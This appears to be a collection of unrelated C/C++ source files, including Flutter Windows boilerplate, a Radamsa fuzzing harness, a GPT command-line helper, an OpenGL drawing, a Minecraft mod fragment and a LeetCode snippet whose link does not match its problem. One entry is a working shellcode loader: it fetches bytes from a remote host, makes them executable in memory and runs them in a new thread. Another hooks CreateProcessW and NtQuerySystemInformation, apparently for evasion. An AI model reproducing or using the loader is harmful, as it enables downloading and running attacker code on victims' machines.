    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "/*\n    Problem Description: Given a string containing lower case english alphabets, what is the most occurring character?\n\n    Example:\n\n    Input: s = \"hello\"\n    Output: l\n    Explanation: Frequencies - 'h': 1, 'e': 1, 'l': 2, 'o': 1\n*/\n\n// Problem Link: https://leetcode.com/problems/find-the-highest-altitude\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nchar highestOccurence(string &str) {\n    int max_char_occured = 0;\n    char max_char = str[0];\n    int freq[26] = {0};\n\n    for(int i = 0; i < str.size(); i++){\n        freq[str[i] - 'a']++;\n        if(freq[str[i] - 'a'] > max_char_occured){\n            max_char_occured = freq[str[i] - 'a'];\n            max_char = str[i];\n        }\n    }\n\n    return max_char;\n\n}\n\nint main() {\n    string s;\n    cout << \"Enter the string: \";\n    cin >> s;\n    \n    /** IGNORE: code to check time taken to run **/\n    time_t start, end;\n    time(&start); \n    ios_base::sync_with_stdio(false); \n    /** IGNORE: code to check time taken to run **/\n    \n    // Main Function Call\n    cout << \"Ans: \" << highestOccurence(s) << endl;\n    \n    /** IGNORE: code to check time taken to run **/\n    time(&end); \n    double time_taken = double(end - start); \n    cout << \"Time taken by program is : \" << fixed \n        << time_taken << setprecision(5); \n    cout << \" sec \" << endl; \n    /** IGNORE: code to check time taken to run **/\n\n    return 0;\n}",
    "#include \"GPTCommunicator.h\"\n#include \"../Utils/FileHandler.h\"\n#include <iostream>\n#include <nlohmann/json.hpp>\n#include <cpr/cpr.h>\n\n#include <vector>\n\n\nstd::string read_api_key()\n{\n#ifdef _WIN32\n\tstd::ifstream file(\"C:/projekte/terminalhelper/apikey.txt\"); // Open the text file\n#else\n\tstd::ifstream file(\"/home/adminlokal/projekte/terminalhelper/apikey.txt\"); // Open the text file\n#endif\n\n\tif (!file)\n\t{ // If the file opening failed\n\t\tstd::cerr << \"Failed to open the API key file!\" << std::endl;\n\t}\n\n\tstd::string api_key;\n\tstd::getline(file, api_key); // Read the API key (assuming it's on the first line)\n\n\tfile.close(); // Close the file\n\n\treturn api_key;\n}\n\n\nstd::string chat_with_gpt(const std::string& message_content, const std::string& system_message = \"\")\n{\n\tconst std::string API_ENDPOINT = \"https://api.openai.com/v1/chat/completions\";\n\tconst std::string API_KEY = read_api_key(); // Replace this with your actual API Key\n\n\tnlohmann::json payload;\n\n\tif (system_message != \"\")\n\t{\n\t\t// Construct the request payload\n\t\tpayload = {\n\t\t\t{\"model\", \"gpt-3.5-turbo\"},\n#ifdef _WIN32\n\n\t\t\t//{\"messages\", {{{\"role\", \"user\"}, {\"content\", message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\",  system_message + \" \\n This is cmd output, TerminalHelper.exe is a programm to use the openai api, so you don't have to care about that.\"}}),\n\t\t\t\t\t//mkdirnlohmann::json::object({{\"role\", \"user\"}, {\"content\", system_message + \" \\n This is cmd output, TerminalHelper.exe is a programm to use the openai api, so you don't have to care about that.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#else\n\t\t\t//{\"messages\", {{{\"role\": \"system\", \"content\" : \"You are an expert for terminal commands on linux.\"}, {\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for terminal commands on linux.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#endif\n\t\t\t{\"temperature\", 0.3} };\n\t}\n\telse\n\t{\n\t\t// Construct the request payload\n\t\tpayload = {\n\t\t\t{\"model\", \"gpt-3.5-turbo\"},\n#ifdef _WIN32\n\n\t\t\t//{\"messages\", {{{\"role\", \"user\"}, {\"content\", message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for the cmd on windows.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"windows cmd command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#else\n\t\t\t//{\"messages\", {{{\"role\": \"system\", \"content\" : \"You are an expert for terminal commands on linux.\"}, {\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for terminal commands on linux.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#endif\n\t\t\t{\"temperature\", 0.3} };\n\t}\n\tsaveRawMessage(payload);\n\n\t// Send the POST request\n\tcpr::Response r = cpr::Post(\n\t\tcpr::Url{ API_ENDPOINT },\n\t\tcpr::Header{\n\t\t\t{\"Content-Type\", \"application/json\"},\n\t\t\t{\"Authorization\", \"Bearer \" + API_KEY} },\n\t\t\tcpr::Body{ payload.dump() });\n\n\tsaveRawResponse(r);\n\t// std::cerr << payload << std::endl;\n\t// Parse the response\n\t// std::cerr << \"Raw API response: \" << r.text << std::endl;\n\t// std::cout << \" \\n \\n  end of raw API response \\n \\n\" << std::endl;\n\tauto response_data = nlohmann::json::parse(r.text);\n\treturn response_data[\"choices\"][0][\"message\"][\"content\"].get<std::string>();\n}\n",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "#include <cmath>\n\n#include <GLES/gl.h>\n#include <SDL/SDL.h>\n\n#include <libreborn/libreborn.h>\n#include <symbols/minecraft.h>\n#include <media-layer/core.h>\n\n#include \"api.h\"\n#include \"achievements.h\"\n#include \"rendering.h\"\n//#include \"inventory.h\"\n\nstruct achievement_t {\n    std::string name = \"Test\";\n    std::string desc = \"No way, it works!\";\n    int item_id = 1;\n    int x = 20, y = 20;\n    bool completed = false;\n    bool hidden = false, force_hidden = false;\n    std::vector<size_t> deps = {};\n    // TODO\n    std::vector<ItemInstance> rewards = {};\n    int section = 0;\n};\n\nstatic std::vector<achievement_t> achievements = {\n    {\"Taking Inventory\", \"Press 'E' to open your inventory\",         340, .x = 20,  .y = 20,  .completed = true},\n    {\"Getting Wood\", \"Attack a tree until a block of wood pops out\", 81,  .x = 20,  .y = 60,  .deps = {0}}, // 17\n    {\"Benchmarking\", \"Craft a workbench with four blocks of planks\", 58,  .x = 20,  .y = 100, .deps = {1}},\n    {\"Time to Mine!\", \"Use planks and sticks to make a pickaxe\",     270, .x = 60,  .y = 20,  .deps = {2}},\n    {\"Time to Strike!\", \"Use planks and sticks to make a sword\",     268, .x = 60,  .y = 60,  .deps = {2}},\n    {\"Time to Farm!\", \"Use planks and sticks to make a hoe\",         290, .x = 60,  .y = 100, .deps = {2}},\n    {\"Bake Bread\", \"Turn wheat into bread\",                          297, .x = 20,  .y = 140, .deps = {5}},\n    {\"Have your cake...\", \"...and eat it too!\",                      92,  .x = 60,  .y = 140, .deps = {5}},\n};\n\nstruct AchievementScreen : Screen {\n    int section = 0;\n};\n\nstruct Vec2 {\n    float x, y;\n    inline Vec2(float x, float y) : x(x), y(y) {}\n    inline Vec2(achievement_t &a) : x(a.x + 8), y(a.y + 8) {}\n    inline Vec2 operator+(Vec2 &other) {\n        return Vec2(x + other.x, y + other.y);\n    }\n    inline Vec2 operator-(Vec2 &other) {\n        return Vec2(x - other.x, y - other.y);\n    }\n    // I can't believe I need to spell this out\n    inline Vec2 operator+=(Vec2 &other) {*this = *this + other; return *this;}\n    inline Vec2 operator-=(Vec2 &other) {*this = *this - other; return *this;}\n};\n\nconstexpr float UV_S = 0.0625;\nstatic float scale = 1;\nstatic Vec2 offset = {0, 0};\nstatic void AchievementScreen_render(Screen *self, UNUSED int x, UNUSED int y, UNUSED float param_1) {\n    // BG\n    GuiComponent_fillGradient((GuiComponent *) self, 0, 0, self->width, self->height, 0xc0101010, 0xd0101010);\n    // Say hello!\n    //std::string msg = \"haiii :3\";\n    //GuiComponent_drawCenteredString((GuiComponent *) self, self->minecraft->font, &msg, self->width / 2, self->height / 2, 0xc0FFFFFF);\n    // Achivements\n    int mx = Mouse_getX() * Gui_InvGuiScale, my = Mouse_getY() * Gui_InvGuiScale;\n    achievement_t *hovered = NULL;\n    // Achievements are rendered backwards to correctly draw dep 